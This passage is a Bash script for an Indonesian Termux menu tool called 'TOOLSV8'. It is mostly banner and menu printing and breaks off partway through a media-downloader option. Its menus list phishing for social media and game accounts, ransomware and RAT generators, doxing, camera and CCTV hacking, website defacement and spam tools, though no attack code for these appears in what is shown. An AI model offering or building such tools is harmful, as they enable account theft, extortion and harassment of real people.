        xdg-open "https://t.me/Kenzzzzzzzzzzzzzzzz870?text=$pesan"
        clear
elif [[ "$input" = "donasi" || "$input" = "DONASI" ]]; then
clear
echo ""
echo ""
echo -e "${red} TERIMAKASIH BANYAK ORANG BAIK SEMOGA DI LANCARKAN REZEKINYA AMIN 🥹🙏"
  sleep 4 
  clear
play -q $HOME/Goblok/oke.mp3 &> /dev/null &
        sleep 1
        play -q $HOME/Goblok/Y.mp3 &> /dev/null &
        pesan=$(
        echo "Assalamualaikum Bang Saya Mau Donasi Untuk Abang Mohon Di Terima Yak Bang!! [ Nomer Dana Saya : 6285691587665 ]"
        )
        isipesan="$pesan"
        xdg-open "https://t.me/Kenzzzzzzzzzzzzzzzz870?text=$pesan"
        clear
elif [[ "$input" = "bk" || "$input" = "BK" ]]; then
clear
fi
}
DOWN() {
mpv --no-video --quiet "$HOME/Goblok/Y.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Goblok/klik.mp3" &> /dev/null &
echo ""
echo "[ By.Thonxyzz404 -X- Toolsv8 😎🔥 ]" | lolcat
echo -e "${g}[ Skrng Tanggall : $tanggal ]"
echo -e "$ran╔══════════════════════════════════════════════════╗"
echo -e "$ran║        \033[32;1m   _     _     _     _     _            $ran  ║"
echo -e "$ran║        \033[32;1m  / \   / \   / \   / \   / \           $ran  ║"
echo -e "$ran║        \033[31;1m ( T ) ( O ) ( O ) ( L ) ( S )          $ran  ║"
echo -e "$ran║        \033[32;1m  \_/   \_/   \_/   \_/   \_/ V8         $ran ║"
echo -e "$ran║                                                $ran  ║"
echo -e "$ran╚══════════════════════════════════════════════════╝"
echo -e "$ran║ ║                                             ║ ║"
echo -e "$ran║ ║                                             ║ ║"
echo -e "$ran╔══════════════════════════════════════════════════════════╗"
echo -e "$ran║\033[33;1m◉\033[32;1m AUTHOR : 𝗕𝘆.𝗧𝗵𝗼𝗻𝘅𝘆𝘇𝘇𝟰𝟬𝟰                        $ran         ║"
echo -e "$ran║\033[33;1m◉\033[34;1m You-ID ${r}: ${c}$(whoami)                               $ran         ║"
echo -e "$ran║\033[33;1m◉\033[35;1m Jumlah Pengguna ${c}:${yellow} $(printf "%03d" "$jumlah")                          $ran         ║"
echo -e "$ran║\033[33;1m◉\033[35;1m Totall Online ${c}:${yellow} $(printf "%03d" "$random_number")                            $ran         ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Setatus : \033[31;1mPREMIUM                        $ran               ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Version : \033[32;1mv1.0.0                         $ran               ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Rilis 17 Desember 2024                                $ran  ║"
echo -e "$ran║\033[33;1m◉\033[31;1m SELAMAT DATANG DII TOOLSV8 🤡🔥          $ran               ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Skrng Jaam : $(date +"%H:%M:%S")                $ran                   ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Skrng Hari : $ucapan                           $ran          ║"
echo -e "$ran║\033[33;1m◉\033[31;1m LAPORKAN BUG JIKA ADA BUG DI TOOLSV8 !!!  $ran              ║"
echo -e "$ran╚══════════════════════════════════════════════════════════╝"
echo -e "\033[33;1m╔═════════════════════════════════════════════╗"
echo -e "\033[33;1m║        ${bold_bg}${bold_gren} ☣ MENU DOWNLOADER MEDIA ☣︎ ${n}     ${yellow}     ║${n}"
echo -e "\033[33;1m╚═════════════════════════════════════════════╝"
echo -e "\033[31;1m║${yellow} [ ${c}70 ${y}] ${red}║ ${green}Download Video IG            \033[31;1m      ║"
echo -e "\033[31;1m║${yellow} [ ${c}71 ${y}] ${red}║ ${green}Download Musik YouTube \033[31;1m            ║"
echo -e "\033[31;1m║${yellow} [ ${c}72 ${y}] ${red}║ ${green}Download Video Tiktok    \033[31;1m          ║"
echo -e "\033[31;1m║${yellow} [ ${c}73 ${y}] ${red}║ ${green}Download Video Snack   \033[31;1m            ║"
echo -e "\033[31;1m║${yellow} [ ${c}74 ${y}] ${red}║ ${green}Download Video Facebook        \033[31;1m    ║"
echo -e "\033[31;1m║${yellow} [ ${c}75 ${y}] ${red}║ ${green}Download Audio Tiktok          \033[31;1m    ║"
echo -e "\033[31;1m║${yellow} [ ${c}76 ${y}] ${red}║ ${green}Download Auto foto URL      \033[31;1m       ║"
echo -e "\033[31;1m║${yellow} [ ${c}77 ${y}] ${red}║ ${green}Download Auto video URL      \033[31;1m      ║"
echo -e "\033[31;1m║${yellow} [ ${c}78 ${y}] ${red}║ ${green}Download Video YouTube    \033[31;1m         ║"
}
PSHG() {
mpv --no-video --quiet "$HOME/Goblok/Y.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Goblok/klik.mp3" &> /dev/null &
echo ""
echo "[ By.Thonxyzz404 -X- Toolsv8 😎🔥 ]" | lolcat
echo -e "${g}[ Skrng Tanggall : $tanggal ]"
echo -e "$ran╔══════════════════════════════════════════════════╗"
echo -e "$ran║        \033[32;1m   _     _     _     _     _            $ran  ║"
echo -e "$ran║        \033[32;1m  / \   / \   / \   / \   / \           $ran  ║"
echo -e "$ran║        \033[31;1m ( T ) ( O ) ( O ) ( L ) ( S )          $ran  ║"
echo -e "$ran║        \033[32;1m  \_/   \_/   \_/   \_/   \_/ V8         $ran ║"
echo -e "$ran║                                                $ran  ║"
echo -e "$ran╚══════════════════════════════════════════════════╝"
echo -e "$ran║ ║                                             ║ ║"
echo -e "$ran║ ║                                             ║ ║"
echo -e "$ran╔══════════════════════════════════════════════════════════╗"
echo -e "$ran║\033[33;1m◉\033[32;1m AUTHOR : 𝗕𝘆.𝗧𝗵𝗼𝗻𝘅𝘆𝘇𝘇𝟰𝟬𝟰                        $ran         ║"
echo -e "$ran║\033[33;1m◉\033[34;1m You-ID ${r}: ${c}$(whoami)                               $ran         ║"
echo -e "$ran║\033[33;1m◉\033[35;1m Jumlah Pengguna ${c}:${yellow} $(printf "%03d" "$jumlah")                          $ran         ║"
echo -e "$ran║\033[33;1m◉\033[35;1m Totall Online ${c}:${yellow} $(printf "%03d" "$random_number")                            $ran         ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Setatus : \033[31;1mPREMIUM                        $ran               ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Version : \033[32;1mv1.0.0                         $ran               ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Rilis 17 Desember 2024                                $ran  ║"
echo -e "$ran║\033[33;1m◉\033[31;1m SELAMAT DATANG DII TOOLSV8 🤡🔥          $ran               ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Skrng Jaam : $(date +"%H:%M:%S")                $ran                   ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Skrng Hari : $ucapan                           $ran          ║"
echo -e "$ran║\033[33;1m◉\033[31;1m LAPORKAN BUG JIKA ADA BUG DI TOOLSV8 !!!  $ran              ║"
echo -e "$ran╚══════════════════════════════════════════════════════════╝"
echo -e "\033[33;1m╔═════════════════════════════════════════════╗"
echo -e "\033[33;1m║       ${bold_bg}${bold_gren} ☣ MENU PSHING MEDIA SOSIAL ☣︎ ${n}  ${yellow}      ║${n}"
echo -e "\033[33;1m╚═════════════════════════════════════════════╝"
echo -e "\033[31;1m║${yellow} [ ${c}81 ${y}] ${red}║ ${green}Pshing Lokasi Botz                ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}82 ${y}] ${red}║ ${green}Pshing Instagram       \033[31;1m            ║"
echo -e "\033[31;1m║${yellow} [ ${c}83 ${y}] ${red}║ ${green}Pshing Pshing Gmail                ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}84 ${y}] ${red}║ ${green}Pshing Akun Moonton ML         \033[31;1m    ║"
echo -e "\033[31;1m║${yellow} [ ${c}85 ${y}] ${red}║ ${green}Pshing Facebook                   ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}86 ${y}] ${red}║ ${green}Pshing Lokasi IG                  ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}87 ${y}] ${red}║ ${green}Pshing Tiktok                     ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}88 ${y}] ${red}║ ${green}Pshing Akun FF                    ${red} ║"
}
ENC() {
mpv --no-video --quiet "$HOME/Goblok/Y.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Goblok/klik.mp3" &> /dev/null &
echo ""
echo "[ By.Thonxyzz404 -X- Toolsv8 😎🔥 ]" | lolcat
echo -e "${g}[ Skrng Tanggall : $tanggal ]"
echo -e "$ran╔══════════════════════════════════════════════════╗"
echo -e "$ran║        \033[32;1m   _     _     _     _     _            $ran  ║"
echo -e "$ran║        \033[32;1m  / \   / \   / \   / \   / \           $ran  ║"
echo -e "$ran║        \033[31;1m ( T ) ( O ) ( O ) ( L ) ( S )          $ran  ║"
echo -e "$ran║        \033[32;1m  \_/   \_/   \_/   \_/   \_/ V8         $ran ║"
echo -e "$ran║                                                $ran  ║"
echo -e "$ran╚══════════════════════════════════════════════════╝"
echo -e "$ran║ ║                                             ║ ║"
echo -e "$ran║ ║                                             ║ ║"
echo -e "$ran╔══════════════════════════════════════════════════════════╗"
echo -e "$ran║\033[33;1m◉\033[32;1m AUTHOR : 𝗕𝘆.𝗧𝗵𝗼𝗻𝘅𝘆𝘇𝘇𝟰𝟬𝟰                        $ran         ║"
echo -e "$ran║\033[33;1m◉\033[34;1m You-ID ${r}: ${c}$(whoami)                               $ran         ║"
echo -e "$ran║\033[33;1m◉\033[35;1m Jumlah Pengguna ${c}:${yellow} $(printf "%03d" "$jumlah")                          $ran         ║"
echo -e "$ran║\033[33;1m◉\033[35;1m Totall Online ${c}:${yellow} $(printf "%03d" "$random_number")                            $ran         ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Setatus : \033[31;1mPREMIUM                        $ran               ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Version : \033[32;1mv1.0.0                         $ran               ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Rilis 17 Desember 2024                                $ran  ║"
echo -e "$ran║\033[33;1m◉\033[31;1m SELAMAT DATANG DII TOOLSV8 🤡🔥          $ran               ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Skrng Jaam : $(date +"%H:%M:%S")                $ran                   ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Skrng Hari : $ucapan                           $ran          ║"
echo -e "$ran║\033[33;1m◉\033[31;1m LAPORKAN BUG JIKA ADA BUG DI TOOLSV8 !!!  $ran              ║"
echo -e "$ran╚══════════════════════════════════════════════════════════╝"
echo -e "\033[33;1m╔═════════════════════════════════════════════╗"
echo -e "\033[33;1m║        ${bold_bg}${bold_gren} ☣ MENU ENCRIPI KODE FILE ☣︎ ${n}       ${yellow}  ║${n}"
echo -e "\033[33;1m╚═════════════════════════════════════════════╝"
echo -e "\033[31;1m║${yellow} [ ${c}ENC1 ${y}] ${red}║ ${green}Encripsi File Bash Emoji       \033[31;1m  ║"
echo -e "\033[31;1m║${yellow} [ ${c}ENC2 ${y}] ${red}║ ${green}Encripi File Bash Marshal       \033[31;1m ║"
echo -e "\033[31;1m║${yellow} [ ${c}ENC3 ${y}] ${red}║ ${green}Encripi File Python Khusus    \033[31;1m   ║"
echo -e "\033[31;1m║${yellow} [ ${c}ENC4 ${y}] ${red}║ ${green}Encripsi File Python Emoji      \033[31;1m ║"
echo -e "\033[31;1m║${yellow} [ ${c}ENC5 ${y}] ${red}║ ${green}Encripsi File Python All Menu   \033[31;1m ║"
}
PHISING() {
mpv --no-video --quiet "$HOME/Goblok/Y.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Goblok/klik.mp3" &> /dev/null &
echo ""
echo "[ By.Thonxyzz404 -X- Toolsv8 😎🔥 ]" | lolcat
echo -e "${g}[ Skrng Tanggall : $tanggal ]"
echo -e "$ran╔══════════════════════════════════════════════════╗"
echo -e "$ran║        \033[32;1m   _     _     _     _     _            $ran  ║"
echo -e "$ran║        \033[32;1m  / \   / \   / \   / \   / \           $ran  ║"
echo -e "$ran║        \033[31;1m ( T ) ( O ) ( O ) ( L ) ( S )          $ran  ║"
echo -e "$ran║        \033[32;1m  \_/   \_/   \_/   \_/   \_/ V8         $ran ║"
echo -e "$ran║                                                $ran  ║"
echo -e "$ran╚══════════════════════════════════════════════════╝"
echo -e "$ran║ ║                                             ║ ║"
echo -e "$ran║ ║                                             ║ ║"
echo -e "$ran╔══════════════════════════════════════════════════════════╗"
echo -e "$ran║\033[33;1m◉\033[32;1m AUTHOR : 𝗕𝘆.𝗧𝗵𝗼𝗻𝘅𝘆𝘇𝘇𝟰𝟬𝟰                        $ran         ║"
echo -e "$ran║\033[33;1m◉\033[34;1m You-ID ${r}: ${c}$(whoami)                               $ran         ║"
echo -e "$ran║\033[33;1m◉\033[35;1m Jumlah Pengguna ${c}:${yellow} $(printf "%03d" "$jumlah")                          $ran         ║"
echo -e "$ran║\033[33;1m◉\033[35;1m Totall Online ${c}:${yellow} $(printf "%03d" "$random_number")                            $ran         ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Setatus : \033[31;1mPREMIUM                        $ran               ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Version : \033[32;1mv1.0.0                         $ran               ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Rilis 17 Desember 2024                                $ran  ║"
echo -e "$ran║\033[33;1m◉\033[31;1m SELAMAT DATANG DII TOOLSV8 🤡🔥          $ran               ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Skrng Jaam : $(date +"%H:%M:%S")                $ran                   ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Skrng Hari : $ucapan                           $ran          ║"
echo -e "$ran║\033[33;1m◉\033[31;1m LAPORKAN BUG JIKA ADA BUG DI TOOLSV8 !!!  $ran              ║"
echo -e "$ran╚══════════════════════════════════════════════════════════╝"
echo -e "\033[33;1m╔═════════════════════════════════════════════╗"
echo -e "\033[33;1m║       ${bold_bg}${bold_gren}  𖤍 MENU PSHING && HACKING 𖤍  ${n}\033[33;1m        ║${n}"
echo -e "\033[33;1m╚═════════════════════════════════════════════╝"
echo -e "\033[31;1m║${yellow} [ ${c}01 ${y}] ${red}║ ${green}Scanner Wifi Pindai       \033[31;1m         ║"
echo -e "\033[31;1m║${yellow} [ ${c}02 ${y}] ${red}║ ${green}Template Gmail Akun               ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}03 ${y}] ${red}║ ${green}SPAM PAIRING WHATSAPP         \033[31;1m     ║"
echo -e "\033[31;1m║${yellow} [ ${c}04 ${y}] ${red}║ ${green}Ransower Generator Script         ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}05 ${y}] ${red}║ ${green}Pembuatan Logo ASCCI              ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}06 ${y}] ${red}║ ${green}Doxing Username To Nik            ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}07 ${y}] ${red}║ ${green}Google Translate                  ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}08 ${y}] ${red}║ ${green}Tampilan Termux Pariasi           ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}09 ${y}] ${red}║ ${green}Check Cokies Instagram            ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}10 ${y}] ${red}║ ${green}Create botz telegram RAT          ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}11 ${y}] ${red}║ ${green}Chat AI WhatsApp                  ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}12 ${y}] ${red}║ ${green}Camera Hack Online Metting        ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}13 ${y}] ${red}║ ${green}DEFACE WEBSITE SERVER             ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}14 ${y}] ${red}║ ${green}Ngrok Auto Prot URL                ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}15 ${y}] ${red}║ ${green}Bruteforce File Zip               ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}16 ${y}] ${red}║ ${green}IP Tracking                       ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}17 ${y}] ${red}║ ${green}Osint Nik                         ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}18 ${y}] ${red}║ ${green}Decoder Encripsy                  ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}19 ${y}] ${red}║ ${green}Hack CCTV Lalulintas + Lingkungan ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}20 ${y}] ${red}║ ${green}GOST TRACKER NUMBERS              ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}21 ${y}] ${red}║ ${green}Scanner Foto Album                ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}22 ${y}] ${red}║ ${green}Apk Ransomware                    ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}23 ${y}] ${red}║ ${green}Spammer NGL                       ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}24 ${y}] ${red}║ ${green}Ubanned WhatsApp                  ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}25 ${y}] ${red}║ ${green}File Auto Seff                    ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}26 ${y}] ${red}║ ${green}Pshing All Sosmed Auto Link URL   ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}27 ${y}] ${red}║ ${green}Convert URL Web                   ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}28 ${y}] ${red}║ ${green}Spam Telegram Via Token           ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}29 ${y}] ${red}║ ${green}Editor Auto Mettadaa File         ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}30 ${y}] ${red}║ ${green}Link All Server                   ${red} ║"
echo -e "\033[31;1m║${yellow} [ ${c}31 ${y}] ${red}║ ${green}Cek Keamanan Akun                  ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}32 ${y}] ${red}║ ${green}Spammer Call                       ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}33 ${y}] ${red}║ ${green}Scanning Domain                    ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}34 ${y}] ${red}║ ${green}APK-TERMUX-KOMPLEKSIBEL            ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}35 ${y}] ${red}║ ${green}Konfigurasi Tombol V8              ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}36 ${y}] ${red}║ ${green}Spammer Telegram                   ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}37 ${y}] ${red}║ ${green}Scanner QR code                    ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}38 ${y}] ${red}║ ${green}Controll Botz Telegram             ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}39 ${y}] ${red}║ ${green}Generator teks sound google        ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}40 ${y}] ${red}║ ${green}Vertikal Auto Desploy              ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}41 ${y}] ${red}║ ${green}Media User Finder                  ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}42 ${y}] ${red}║ ${green}Seeker All Menu                    ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}43 ${y}] ${red}║ ${green}Spam OTP + CALL                    ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}44 ${y}] ${red}║ ${green}Serveonet Koneksi Server           ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}45 ${y}] ${red}║ ${green}Spammer Gmail                      ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}46 ${y}] ${red}║ ${green}All-Game Via Web                   ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}47 ${y}] ${red}║ ${green}Check Umur Seseorang               ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}48 ${y}] ${red}║ ${green}Clauderfred Koneksi Server         ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}49 ${y}] ${red}║ ${green}Upload Gambar + Video URL          ${red}║"
echo -e "\033[31;1m║${yellow} [ ${c}50 ${y}] ${red}║ ${green}Scan File Berisi Berbahaya         ${red}║"
echo -e "\033[35;1m╔═════════════════════════════════════════════╗"
echo -e "\033[35;1m║       ${bold_bg}${bold_gren}  LIST MENU SETTING TOOLSV8  ${n}\033[35;1m         ║${n}"
echo -e "\033[35;1m╚═════════════════════════════════════════════╝"
}
KOSONG() {
clear 
echo ""
mpv --no-video --quiet "$HOME/Goblok/salah.mp3" &> /dev/null &
echo -e "${bold_bg}${green} PILIHAN ANDA TIDAK VALID..!!${n}"
echo ""
sleep 3
clear 
echo ""
mpv --no-video --quiet "$HOME/Goblok/Y.mp3" &> /dev/null &
echo -e "${r}         ⛔ PERINGATAN ⛔ "
echo ""
echo -e "${c}  PILIHAN BAGIAN NOMER ${r}[ ${g}94${r} ]"
echo -e "${c}  AGAR BISA KEMBALI LAGI KE MENU AWAL"
echo -e "${c}  JIKA ANDA TIDAK SENGAJA MEMILIH MENU"
echo -e "${c}  YANG TIDAK FALID ATUPUN TIDAK ADA DI"
echo -e "${y}  TOOLSV8 INI...!!"
echo ""
}
mpv --no-video --quiet "$HOME/Goblok/Y.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Goblok/klik.mp3" &> /dev/null &
echo ""
echo "[ By.Thonxyzz404 -X- Toolsv8 😎🔥 ]" | lolcat
echo -e "${g}[ Skrng Tanggall : $tanggal ]"
echo -e "$ran╔══════════════════════════════════════════════════╗"
echo -e "$ran║        \033[32;1m   _     _     _     _     _            $ran  ║"
echo -e "$ran║        \033[32;1m  / \   / \   / \   / \   / \           $ran  ║"
echo -e "$ran║        \033[31;1m ( T ) ( O ) ( O ) ( L ) ( S )          $ran  ║"
echo -e "$ran║        \033[32;1m  \_/   \_/   \_/   \_/   \_/ V8         $ran ║"
echo -e "$ran║                                                $ran  ║"
echo -e "$ran╚══════════════════════════════════════════════════╝"
echo -e "$ran║ ║                                             ║ ║"
echo -e "$ran║ ║                                             ║ ║"
echo -e "$ran╔══════════════════════════════════════════════════════════╗"
echo -e "$ran║\033[33;1m◉\033[32;1m AUTHOR : 𝗕𝘆.𝗧𝗵𝗼𝗻𝘅𝘆𝘇𝘇𝟰𝟬𝟰                        $ran         ║"
echo -e "$ran║\033[33;1m◉\033[34;1m You-ID ${r}: ${c}$(whoami)                               $ran         ║"
echo -e "$ran║\033[33;1m◉\033[35;1m Jumlah Pengguna ${c}:${yellow} $(printf "%03d" "$jumlah")                          $ran         ║"
echo -e "$ran║\033[33;1m◉\033[35;1m Totall Online ${c}:${yellow} $(printf "%03d" "$random_number")                            $ran         ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Setatus : \033[31;1mPREMIUM                        $ran               ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Version : \033[32;1mv1.0.0                         $ran               ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Rilis 17 Desember 2024                                $ran  ║"
echo -e "$ran║\033[33;1m◉\033[31;1m SELAMAT DATANG DII TOOLSV8 🤡🔥          $ran               ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Skrng Jaam : $(date +"%H:%M:%S")                $ran                   ║"
echo -e "$ran║\033[33;1m◉\033[36;1m Skrng Hari : $ucapan                           $ran          ║"
echo -e "$ran║\033[33;1m◉\033[31;1m LAPORKAN BUG JIKA ADA BUG DI TOOLSV8 !!!  $ran              ║"
echo -e "$ran╚══════════════════════════════════════════════════════════╝"
echo -e  "\033[32;1m╔═════════════════════════════════════════════╗"
echo -e  "\033[32;1m║      ${bold_bg}${bold_gren}  SILAHKAN PILIH TOOLS DIBAWAH  ${n}\033[32;1m       ║${n}"
echo -e  "\033[32;1m╚═════════════════════════════════════════════╝"
echo -e  "\033[31;1m║                                             ║"
echo -e  "\033[31;1m║                                             ║"
echo -e  "\033[32;1m╔═════════════════════════════════════════════╗"
echo -e  "\033[32;1m║${red}  [${green} ALL ${red}]${cyan}    ║${yellow} MENU HACKING MEDIA            ${green}║"
echo -e  "\033[32;1m║${red}  [${green} PSHG ${red}]${cyan}   ║${yellow} MENU PSHING MEDIA             ${green}║"
echo -e  "\033[32;1m║${red}  [${green} DOWN ${red}]${cyan}   ║${yellow} MENU DOWNLOAD MEDIA           ${green}║"
echo -e  "\033[32;1m║${red}  [${green} ENC ${red}]${cyan}    ║${yellow} MENU ENCRIPI KODE FILE        ${green}║"
echo -e  "\033[32;1m║${red}  [${green} BUY ${red}]${cyan}    ║${yellow} PRODUK BERBAYAR               ${green}║"
echo -e  "\033[32;1m╚═════════════════════════════════════════════╝"
echo -e  "\033[31;1m║                                             ║"
echo -e  "\033[31;1m║                                             ║"
echo -e "\033[32;1m╔═════════════════════════════════════════════╗"
echo -e "\033[32;1m║         ${bold_bg}${bold_gren}  TOOLSV8 BY.THONXYZZ404  ${n}\033[32;1m          ║${n}"
echo -e "\033[32;1m╚═════════════════════════════════════════════╝"
echo -e  "\033[31;1m║                                             ║"
echo -e "\033[35;1m╔═════════════════════════════════════════════╗"
echo -e "\033[35;1m║\033[31;1m   Silahkan Pilihlah Menu TOOLSV8 [ 😈🔥 ] \033[35;1m  ║"
echo -e "\033[35;1m╚═════════════════════════════════════════════╝"
echo "• Hallo : ☠️ $nama ☠️
• Selamat : $sambutan
• Telegram : t.me/Kenzzzzzzzzzzzzzzzz870
• Akun-Tiktok : @thonxyzz404" | boxes -d "$cok" | lolcat
echo "│"
read -p '╰─────────▶ ' input
echo ""
if [[ "$input" = "all" || "$input" = "ALL" ]]; then
  clear
  PHISING
elif [[ "$input" = "down" || "$input" = "DOWN" ]]; then
  clear
  DOWN
elif [[ "$input" = "pshg" || "$input" = "PSHG" ]]; then
  clear
  PSHG
elif [[ "$input" = "enc" || "$input" = "ENC" ]]; then
  clear
  ENC
elif [[ "$input" = "buy" || "$input" = "BUY" ]]; then
  clear
  PRODUK
else
  clear
  KOSONG
fi
echo -e "\033[31;1m╔═════════════════════════════════════════════╗"
echo -e "\033[31;1m║           ${bold_bg}${bold_gren}  PENGATURAN TOOLSV8  ${n}         ${red}   ║${n}"
echo -e "\033[31;1m╠═════════════════════════════════════════════╣"
echo -e "\033[31;1m║${cyan}╰┈➤ ${yellow}[91]◉ ${green}[ ${cyan}Laporkan__BUGS${green} ]              ${red}   ║"
echo -e "\033[31;1m║${cyan}╰┈➤ ${red}[${yellow}92${red}]${cyan}◉ ${yellow}[ MANAGER SETTING SOUND ]         ${red} ║"
echo -e "\033[31;1m║${cyan}╰┈➤ ${yellow}[93]◉ ${green}[ Pemberitahuan ]             ${red}     ║"
echo -e "\033[31;1m║${cyan}╰┈➤ ${yellow}[94]◉ ${red}[ KEMBALI KE MENU AWAL ]      ${red}     ║"
echo -e "\033[31;1m║${cyan}╰┈➤ ${yellow}[95]◉ ${green}[ Keluar ]                       ${red}  ║"
echo -e "\033[31;1m╚═════════════════════════════════════════════╝"
echo -e "\033[35;1m╔═════════════════════════════════════════════╗"
echo -e "\033[35;1m║\033[31;1m   Silahkan Pilihlah Menu TOOLSV8 [ 😈🔥 ] \033[35;1m  ║"
echo -e "\033[35;1m╚═════════════════════════════════════════════╝"
echo "• Hallo : ☠️ $nama ☠️
• Selamat : $sambutan
• Telegram : t.me/Kenzzzzzzzzzzzzzzzz870
• Akun-Tiktok : @thonxyzz404" | boxes -d "$cok" | lolcat
echo "│"
read -p '╰─────────▶ ' neo
echo ""
case $neo in
       70)
              echo""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
if ! command -v yt-dlp >/dev/null 2>&1; then
    echo ""
    echo -e "${r} yt-dlp belum terinstal. menginstal...!!"
    sleep 2 
    echo -e "${n}"
    pkg install -y yt-dlp
fi
TARGET_DIR="/sdcard/Download"
clear
echo "
⠀⠀⠀⣠⣴⡶⣿⢿⣻⣟⡿⣟⣿⣻⢿⣻⣟⡿⣟⣿⣻⢿⣻⢿⡶⣦⣀⠀⠀⠀
⠀⣠⡾⣟⣾⡽⠟⠛⠛⠚⠙⠋⠓⠋⠛⠙⠚⠙⠋⠓⠛⠛⠛⠯⢿⣽⣻⣷⡄⠀
⣰⡿⣽⠿⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣠⣤⡀⠘⢿⣞⣿⣂
⣿⢿⣽⠃⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣄⣠⣠⡀⡀⠀⠀⣾⢿⣽⣻⠄⢈⣿⡷⣿
⣿⣻⣾⠄⠀⠀⠀⠀⠀⣠⣶⣟⣯⡿⣽⣻⣽⣟⡿⣶⣄⠉⠛⠊⠃⠀⠨⣿⣽⢿
⣿⣳⣯⠀⠀⠀⠀⢀⣼⣟⣾⡽⠃⠉⠁⠁⠈⠙⢻⡷⣟⣧⠀⠀⠀⠀⠀⣿⢾⣻
⣿⣳⣯⠀⠀⠀⠀⣼⣟⣾⡍⠀⠀⠀⠀⠀⠀⠀⠀⢹⡿⣽⣧⠀⠀⠀⠀⣯⢿⣻
⣿⣳⣯⠀⠀⠀⠀⣻⣽⣾⡀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣟⣿⣎⠀⠀⠀⠀⣻⡿⣽
⣿⣳⣯⠀⠀⠀⠀⢻⣟⣾⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣟⡷⡿⠀⠀⠀⠀⣿⡽⣿
